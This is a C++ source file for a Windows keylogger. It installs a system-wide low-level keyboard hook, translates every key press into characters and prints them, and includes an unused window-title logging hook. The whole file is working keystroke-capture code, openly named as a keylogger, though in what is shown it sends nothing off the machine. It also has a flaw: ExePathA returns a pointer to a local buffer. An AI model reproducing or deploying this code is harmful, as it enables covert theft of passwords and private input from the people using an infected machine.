#include "keylogger.h"
#include <iostream>

HHOOK hook;
HHOOK CBTHook;
std::vector<char> keylogger::buffer = std::vector<char>();

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        BYTE state[256] = { 0 };
        wchar_t str[2] = { 0 };
        auto keyboard_layout = GetKeyboardLayout(0);

        GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
        GetKeyboardState(state);
        if (ToUnicodeEx(kb->vkCode, kb->scanCode,
            state, str, sizeof(str) / sizeof(*str) - 1, 0, keyboard_layout) > 0)
        {
            if (kb->vkCode == VK_RETURN) std::wcout << "\n";
            else wprintf(L"%c", str[0]);
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

LRESULT CALLBACK BCK_WndShellProc(int nMsg, WPARAM wParam, LPARAM lParam) {
    if (nMsg == HCBT_SETFOCUS) {
        std::wstring title(GetWindowTextLength((HWND)wParam) + 1, L'\0');
        GetWindowTextW((HWND)wParam, &title[0], title.size()); //note: C++11 only
        std::wcout << "Title: " << title << "\n\n";
    }
    return 0;
}

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
    keylogger::buffer.reserve(1048);

    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR)lpParm);
    if (!hInstance) return 1;

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);
    MessageLoop();
    UnhookWindowsHookEx(hook);
    UnhookWindowsHookEx(CBTHook);
    return 0;
}

CHAR* ExePathA() {
    CHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return buffer;
}